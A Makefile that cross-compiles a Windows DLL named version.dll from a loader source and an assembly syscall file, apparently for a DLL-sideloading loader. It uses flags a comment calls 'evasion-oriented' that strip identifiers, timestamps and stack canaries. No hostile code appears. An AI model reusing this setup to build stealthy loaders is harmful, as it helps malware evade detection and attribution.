# =============================================================================
# Vector Build System – Release / Debug Targets
# =============================================================================

CXX      = x86_64-w64-mingw32-g++
NASM     = nasm
STRIP    = x86_64-w64-mingw32-strip

# Output
BIN_DIR  = bin
TARGET   = $(BIN_DIR)/version.dll

# Source files
SRC_CPP  = src/loader.cpp
SRC_ASM  = src/syscalls.asm

# Object files
OBJ_CPP  = $(BIN_DIR)/loader.o
OBJ_ASM  = $(BIN_DIR)/syscalls.o
OBJECTS  = $(OBJ_CPP) $(OBJ_ASM)

# =============================================================================
# COMMON FLAGS
# =============================================================================

# Compilation: security-hardened, evasion-oriented
CFLAGS_COMMON = -m64 -mwindows \
    -fno-asynchronous-unwind-tables \
    -fno-exceptions -fno-rtti \
    -fmerge-all-constants \
    -fvisibility=hidden \
    -ffunction-sections -fdata-sections \
    -fno-stack-protector \
    -fno-ident \
    -I./src

# Linker: stripped, ASLR/DEP/HEVA, dead-code elimination
LDFLAGS_COMMON = -shared -static-libgcc -static-libstdc++ \
    -Wl,--strip-all \
    -Wl,--discard-all \
    -Wl,--dynamicbase \
    -Wl,--nxcompat \
    -Wl,--high-entropy-va \
    -Wl,--subsystem,windows \
    -Wl,--gc-sections \
    -Wl,--no-insert-timestamp \
    -lole32 -loleaut32 -luuid

# NASM flags
NASMFLAGS = -f win64

# =============================================================================
# RELEASE FLAGS (default)
# =============================================================================

CFLAGS_RELEASE  = $(CFLAGS_COMMON) -O3 -s -DNDEBUG
LDFLAGS_RELEASE = $(LDFLAGS_COMMON)

# =============================================================================
# DEBUG FLAGS
# =============================================================================

CFLAGS_DEBUG  = $(CFLAGS_COMMON) -O0 -g -DDEBUG -D_DEBUG
LDFLAGS_DEBUG = -shared -static-libgcc -static-libstdc++ \
    -Wl,--dynamicbase -Wl,--nxcompat \
    -Wl,--high-entropy-va -Wl,--subsystem,windows \
    -Wl,--no-insert-timestamp \
    -lole32 -loleaut32 -luuid

# =============================================================================
# DEFAULT: Release build
# =============================================================================

# Active flags (overridden by debug target)
CFLAGS  = $(CFLAGS_RELEASE)
LDFLAGS = $(LDFLAGS_RELEASE)

.PHONY: all release debug clean size help

all: release

release: CFLAGS  = $(CFLAGS_RELEASE)
release: LDFLAGS = $(LDFLAGS_RELEASE)
release: $(TARGET)
	@echo "[RELEASE] Build complete: $(TARGET)"
	@$(MAKE) --no-print-directory size

debug: CFLAGS  = $(CFLAGS_DEBUG)
debug: LDFLAGS = $(LDFLAGS_DEBUG)
debug: $(TARGET)
	@echo "[DEBUG] Build complete: $(TARGET)"
	@$(MAKE) --no-print-directory size

# =============================================================================
# BUILD RULES
# =============================================================================

$(BIN_DIR):
	@mkdir -p $(BIN_DIR)

$(OBJ_CPP): $(SRC_CPP) | $(BIN_DIR)
	$(CXX) $(CFLAGS) -c $< -o $@

$(OBJ_ASM): $(SRC_ASM) | $(BIN_DIR)
	$(NASM) $(NASMFLAGS) $< -o $@

$(TARGET): $(OBJECTS)
	$(CXX) $(OBJECTS) $(LDFLAGS) -o $@

# =============================================================================
# SIZE REPORT
# =============================================================================

size:
	@echo "--- Binary Size Report ---"
	@ls -lh $(TARGET) 2>/dev/null || echo "  (not built yet)"
	@x86_64-w64-mingw32-size $(TARGET) 2>/dev/null || true
	@echo "--------------------------"

# =============================================================================
# CLEAN
# =============================================================================

clean:
	rm -f $(BIN_DIR)/*.o $(BIN_DIR)/*.dll

# =============================================================================
# HELP
# =============================================================================

help:
	@echo "Usage:"
	@echo "  make            - Build release (default)"
	@echo "  make release    - Build optimized release DLL"
	@echo "  make debug      - Build debug DLL with symbols"
	@echo "  make size       - Show binary size report"
	@echo "  make clean      - Remove build artifacts"
	@echo ""
	@echo "Security flags:"
	@echo "  -fno-stack-protector  : Remove stack canaries"
	@echo "  -fno-ident            : Remove compiler identification"
	@echo "  --no-insert-timestamp : No PE timestamp"
	@echo "  --gc-sections         : Dead code elimination"
